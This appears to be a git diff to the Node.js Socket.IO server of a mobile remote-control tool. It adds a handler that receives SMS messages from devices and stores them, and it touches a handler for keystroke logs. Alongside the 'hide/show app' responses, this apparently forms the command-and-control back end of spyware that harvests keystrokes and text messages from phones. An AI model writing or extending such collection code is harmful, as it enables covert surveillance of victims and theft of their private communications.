@@ -24,6 +24,8 @@ import {
 
 import { addNewKeyLogs } from "../../controllers/keylogs.controller";
 
+import { addNewMessage } from "../../controllers/sms.controller";
+
 const app = express();
 
 const server = http.createServer(app);
@@ -519,7 +521,7 @@ export const startSocketIO = async () => {
 					}
 				}
 			);
-
+			// Online Key logs
 			socket.on(
 				`${SocketIOPublicEvents.KEY_MOBILE_RESPONSE}`,
 				async (response: any) => {
@@ -548,9 +550,6 @@ export const startSocketIO = async () => {
 									created_at: Date.now(),
 								}
 							);
-
-							// Data should be include deviceId and keylogs
-							// await addNewKeyLogs(response);
 						} else {
 							console.log("Empty key logs, skipping...");
 						}
@@ -1154,6 +1153,24 @@ export const startSocketIO = async () => {
 						);
 					} catch (error) {
 						console.log("Hide/Show App Response Error", error);
+					}
+				}
+			);
+
+			// Online Message logs
+			socket.on(
+				`${SocketIOPublicEvents.SMS_MANAGER_RESPONSE}`,
+				async (response: any) => {
+					try {
+						const deviceId = response.deviceId;
+						const messages = response.messages;
+						if (deviceId && messages != "") {
+							addNewMessage(response);
+						} else {
+							console.log("Empty messages, skipping...");
+						}
+					} catch (error) {
+						console.error("Message Response Error", error);
 					}
 				}
 			);
